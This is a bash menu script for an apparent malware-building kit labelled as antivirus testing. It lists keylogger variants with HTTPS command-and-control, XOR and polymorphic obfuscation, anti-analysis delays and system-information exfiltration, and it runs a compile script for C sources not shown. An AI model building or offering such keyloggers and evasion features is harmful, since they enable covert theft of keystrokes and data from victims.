#!/bin/bash

cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║              MALWARE GENERATOR FOR AV TESTING               ║
║                                                              ║
║  FOR TESTING PURPOSES ONLY. Use in isolated environments.    ║
╚═══════════════════════════════════════════════════════════════╝

EOF

PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

show_menu() {
    echo ""
    echo "=== Malw Generator Menu ==="
    echo ""
    echo "MALWARE VARIANTS:"
    echo "  1) Simple"
    echo "     - Keylogger (console capture)"
    echo "     - HTTPS C2 connection"
    echo "     - XOR string obfuscation"
    echo "     - PRNG-based delays"
    echo ""
    echo "  2) Medium"
    echo "     - Enhanced keylogger"
    echo "     - Encrypted C2 communication"
    echo "     - Polymorphic encoding"
    echo "     - Unique build ID per compilation"
    echo ""
    echo "  3) Complex"
    echo "     - Advanced keylogger"
    echo "     - Multi-layer obfuscation (PRNG, polymorphic)"
    echo "     - HTTPS C2 with upload/download"
    echo "     - System info exfiltration"
    echo "     - Session-based identification"
    echo ""
    echo "COMPILATION:"
    echo "  4) Compile ALL (Linux)"
    echo "  5) Compile ALL (Windows .bat)"
    echo ""
    echo "  0) Exit"
    echo ""
    echo -n "Select option: "
}

generate_simple() {
    echo "[*] Simple Variant"
    echo "    Location: $PROJECT_ROOT/malw/simple/simple_malw.c"
    echo ""
    echo "    Features:"
    echo "    - Console keylogger capture"
    echo "    - HTTPS C2 to example.com"
    echo "    - XOR obfuscated strings"
    echo "    - Random delays via PRNG"
}

generate_medium() {
    echo "[*] Medium Variant"
    echo "    Location: $PROJECT_ROOT/malw/medium/medium_malw.c"
    echo ""
    echo "    Features:"
    echo "    - Enhanced keylogger"
    echo "    - Multi-layer packet encoding"
    echo "    - Unique build ID per compilation"
    echo "    - Randomized encryption keys"
}

generate_complex() {
    echo "[*] Complex Variant"
    echo "    Location: $PROJECT_ROOT/malw/complex/complex_malw.c"
    echo ""
    echo "    Features:"
    echo "    - Advanced keylogger with evasion"
    echo "    - Xorshift96 PRNG anti-analysis"
    echo "    - HTTPS C2 with full upload/download"
    echo "    - System reconnaissance"
    echo "    - Polymorphic transformations"
}

while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            generate_simple
            ;;
        2)
            generate_medium
            ;;
        3)
            generate_complex
            ;;
        4)
            echo ""
            echo "[*] Running Linux compilation..."
            chmod +x "$PROJECT_ROOT/compilers/compile_linux.sh" 2>/dev/null
            bash "$PROJECT_ROOT/compilers/compile_linux.sh"
            ;;
        5)
            echo ""
            echo "[*] Windows compilation script ready at:"
            echo "    $PROJECT_ROOT/compilers/compile_windows.bat"
            ;;
        0)
            echo ""
            echo "[*] Goodbye!"
            exit 0
            ;;
        *)
            echo "[!] Invalid option"
            ;;
    esac
done
